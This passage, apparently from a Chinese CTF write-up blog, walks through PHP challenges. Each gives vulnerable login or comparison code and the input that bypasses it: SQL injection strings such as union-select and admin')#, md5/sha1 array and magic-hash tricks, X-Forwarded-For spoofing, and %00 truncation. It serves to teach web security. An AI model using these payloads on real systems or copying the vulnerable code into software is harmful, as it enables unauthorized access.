class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>===会比较类型，比如bool sha1()函数和md5()函数存在着漏洞，sha1()函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使sha1()函数返回错误，也就是返回false，这样一来===运算符就可以发挥作用了，需要构造username和password既不相等，又同样是数组类型</p><p>?name[]=a&amp;password[]=b</p><h2 id="SESSION验证绕过"><a href="#SESSION验证绕过" class="headerlink" title="SESSION验证绕过"></a>SESSION验证绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] == $_SESSION[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span> (<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/Php_Bug/08.php?password=" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/08.php?password=</a></p><p>删除cookies或者删除cookies的值</p><h2 id="密码md5比较绕过"><a href="#密码md5比较绕过" class="headerlink" title="密码md5比较绕过"></a>密码md5比较绕过</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置数据库</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="string">"********, "</span>*****<span class="string">", "</span>********");</span><br><span class="line">    mysql_select_db(<span class="string">"phpformysql"</span>) or die(<span class="string">"Could not select database"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">        die(<span class="string">"Connection failed: "</span> . mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span><br><span class="line"><span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//sql语句</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// select pw from php where user='' union select 'e10adc3949ba59abbe56e057f20f883e' #</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&amp;pass=123456</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select pw from php where user='$user'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$query</span>) &#123;</span><br><span class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error(<span class="variable">$conn</span>));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    echo(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>用union select来返回一个已知明文的md5，payload：<br>user=’ union select ‘202cb962ac59075b964b07152d234b70’#&amp;pass=123</p><h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">  echo(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>?id=%2568ackerDJ</p><h2 id="sql闭合绕过"><a href="#sql闭合绕过" class="headerlink" title="sql闭合绕过"></a>sql闭合绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(<span class="string">"*******"</span>, <span class="string">"****"</span>, <span class="string">"****"</span>);</span><br><span class="line">    mysql_select_db(<span class="string">"****"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//select user from php where (user='admin')#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//exp:admin')#</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select user from php where (user='$user') and (pw='$pass')"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">'user'</span>]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">'user'</span>] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造exp闭合绕过 admin’)#</p><h2 id="X-Forwarded-For绕过指定IP地址"><a href="#X-Forwarded-For绕过指定IP地址" class="headerlink" title="X-Forwarded-For绕过指定IP地址"></a>X-Forwarded-For绕过指定IP地址</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span></span><br><span class="line"><span class="php">    $cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span></span><br><span class="line"><span class="php">    $cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span></span><br><span class="line"><span class="php">    $cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">    $cip = <span class="string">"0.0.0.0"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> $cip;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$GetIPs = GetIP();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>HTTP头添加X-Forwarded-For:1.1.1.1</p><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$md52 = @md5($a);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span></span><br><span class="line"><span class="php">&#125;&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>==对比的时候会进行数据转换，0eXXXXXXXXXX 转成0了，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</p><h2 id="intval函数四舍五入"><a href="#intval函数四舍五入" class="headerlink" title="intval函数四舍五入"></a>intval函数四舍五入</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_GET[id]) &#123;</span></span><br><span class="line"><span class="php">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span></span><br><span class="line"><span class="php">  mysql_select_db(SAE_MYSQL_DB);</span></span><br><span class="line"><span class="php">  $id = intval($_GET[id]);</span></span><br><span class="line"><span class="php">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>($query[content]);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>构造  id=1024.1212<br>intval函数四舍五入，取值为1024，但if语句中已成功绕过1024的限制</p><h2 id="strpos数组绕过NULL与ereg正则-00截断"><a href="#strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="strpos数组绕过NULL与ereg正则%00截断"></a>strpos数组绕过NULL与ereg正则%00截断</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>方法一： 既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.</p><p>方法二： 字符串截断,利用ereg()的NULL截断漏洞，绕过正则过滤 <a href="http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/16.php?nctf=1%00#biubiubiu</a> 错误 需将#编码 <a href="http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu</a> 正确</p><h2 id="SQL注入or绕过"><a href="#SQL注入or绕过" class="headerlink" title="SQL注入or绕过"></a>SQL注入or绕过</h2><p>地址: <a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web15/index.php</a><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; <span class="regexp">//get</span>_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置</span><br><span class="line">        $str=stripslashes($str); <span class="regexp">//</span>返回一个去除转义反斜线后的字符串（\<span class="string">' 转换为 '</span> 等等）。双反斜线（\\）被转换为单个反斜线（\）。</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">/<span class="regexp">/$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';</span></span><br><span class="line"><span class="regexp">$result=mysql_query($query);</span></span><br><span class="line"><span class="regexp">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span></span><br><span class="line"><span class="regexp">    die('Invalid password!');</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">echo $flag;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>注意上面clean function中的htmlentities()函数，它会把输入字符中的 ’ 或者 ” 转变为html实体，这样一来就无法闭合源代码中的 ’ 了，还有就是，如果php的magic_quotes_gpc是开启状态的话，我们输入的转义符也会被去掉的，不过既然这道题目能做，说明我们是可以使用转义符 \ ，我们解这道题的关键就是使用转义符 \ 来让源代码中<br>‘SELECT * FROM users WHERE name=\’’.$username.’\’ AND pass=\’’.$password.’\’;’<br>$username后面的 ’ 失效，只要 这个 ’ 失效，就能闭合name=后面的 ’ ，要达到这一目的，我们只需要让username=admin \即可，让后使password的值为一个永真式(or 1=1)就可以得到这道题的flag<br>这样提交的数据，会导致源代码中的SQL语句变为：</p><p>SELECT * FROM users WHERE name=’admin \’ AND pass=’ or 1=1<br>1<br>注入语句?username=admin \&amp;password=or 1=1#</p><h2 id="密码md5比较绕过-1"><a href="#密码md5比较绕过-1" class="headerlink" title="密码md5比较绕过"></a>密码md5比较绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span></span><br><span class="line"><span class="php">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span></span><br><span class="line"><span class="php">  mysql_select_db(SAE_MYSQL_DB);</span></span><br><span class="line"><span class="php">  $user = $_POST[user];</span></span><br><span class="line"><span class="php">  $pass = md5($_POST[pass]);</span></span><br><span class="line"><span class="php">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user=' $user '"</span>));</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//strcasecmp:0 - 如果两个字符串相等</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>//select pw from ctf where user=’’and 0=1 union select  ‘e10adc3949ba59abbe56e057f20f883e’ #<br>?user=’and 0=1 union select ‘e10adc3949ba59abbe56e057f20f883e’ #&amp;pass=123456</p><h2 id="md5-函数-使用数组绕过"><a href="#md5-函数-使用数组绕过" class="headerlink" title="md5()函数===使用数组绕过"></a>md5()函数===使用数组绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">若为md5($<span class="emphasis">_GET['username']) == md5($_</span>GET[<span class="emphasis">'password'</span>]) 则可以构造： http://127.0.0.1/Php<span class="emphasis">_Bug/18.php?username=QNKCDZO&amp;password=240610708 因为==对比的时候会进行数据转换，0eXXXXXXXXXX 转成0了 也可以使用数组绕过 http://127.0.0.1/Php_</span>Bug/18.php?username[]=1&amp;password[]=2</span><br><span class="line"></span><br><span class="line">但此处是===，只能用数组绕过，PHP对数组进行hash计算都会得出null的空值 <span class="link">http://127.0.0.1/Php_Bug/18.php?username</span>[<span class="string"></span>]=1&amp;password[]=2</span><br></pre></td></tr></table></figure><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 